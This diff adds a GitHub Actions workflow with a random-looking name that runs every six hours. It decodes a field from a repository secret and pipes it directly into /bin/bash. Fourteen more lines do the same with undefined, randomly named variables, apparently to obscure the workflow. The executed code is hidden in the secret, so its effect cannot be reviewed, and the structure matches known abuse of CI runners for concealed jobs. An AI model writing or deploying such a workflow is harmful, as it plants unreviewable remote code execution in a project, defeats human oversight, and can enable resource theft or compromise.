@@ -1,0 +1,30 @@
+name: jiangkaishen3198
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangkaishen3198
+        env:
+          vto2002: ${{ secrets.vto2002 }}
+        run: |
+          echo $vto2002 | jq -r .txkym89 | /bin/bash
+          echo $n743 | jq -r .fbbyo330 | /bin/bash
+          echo $a4 | jq -r .w7 | /bin/bash
+          echo $w9 | jq -r .yn9641 | /bin/bash
+          echo $l35796 | jq -r .an876 | /bin/bash
+          echo $by254 | jq -r .uync5 | /bin/bash
+          echo $fzyqv6227 | jq -r .rram52 | /bin/bash
+          echo $frir92 | jq -r .clzzn10 | /bin/bash
+          echo $qym9686 | jq -r .gewra6629 | /bin/bash
+          echo $iieks58027 | jq -r .owa1 | /bin/bash
+          echo $muim3391 | jq -r .u59277 | /bin/bash
+          echo $iv04 | jq -r .t2198 | /bin/bash
+          echo $hoelh765 | jq -r .zla97444 | /bin/bash
+          echo $dc0946 | jq -r .yklxq09 | /bin/bash
+          echo $uflfb54 | jq -r .szz87 | /bin/bash
+
